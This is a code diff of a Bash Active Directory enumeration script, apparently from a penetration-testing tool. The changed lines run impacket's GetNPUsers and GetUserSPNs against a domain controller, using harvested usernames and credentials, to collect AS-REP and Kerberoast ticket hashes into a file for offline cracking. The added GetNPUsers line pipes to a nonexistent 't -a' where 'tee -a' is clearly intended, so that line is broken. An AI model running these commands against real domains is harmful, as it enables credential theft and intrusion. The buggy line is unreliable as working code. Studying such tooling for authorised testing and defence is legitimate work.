@@ -130,11 +130,11 @@ for port in $open_ports; do
             nmap $target -p"$port" --host-timeout 3s -T5 | grep -vE 'Nmap|latency|nmap' | sed '1d'
             if [ -s "$enumx_dir/domains" ]; then
                 for domain in $(cat "$enumx_dir/domains"); do
-                    PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -viE '[-]' 2>/dev/null
+                    PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -iE '$krb5asrep' 2>/dev/null | t -a "$enumx_dir/hashes"
                 done
                 for domain in $(cat "$enumx_dir/domains"); do
                     for cred in $(cat "$enumx_dir/creds"); do
-                         PYTHONWARNINGS="ignore" impacket-GetUserSPNs -request -dc-ip "$target" "$domain"/"$cred" | grep '$krb5tgs' 2>/dev/null | tee -a "$enumx_dir/hashes"
+                         PYTHONWARNINGS="ignore" impacket-GetUserSPNs -request -dc-ip "$target" "$domain"/"$cred" | grep -iE '$krb5tgs' 2>/dev/null | tee -a "$enumx_dir/hashes"
                     done
                 done
             fi
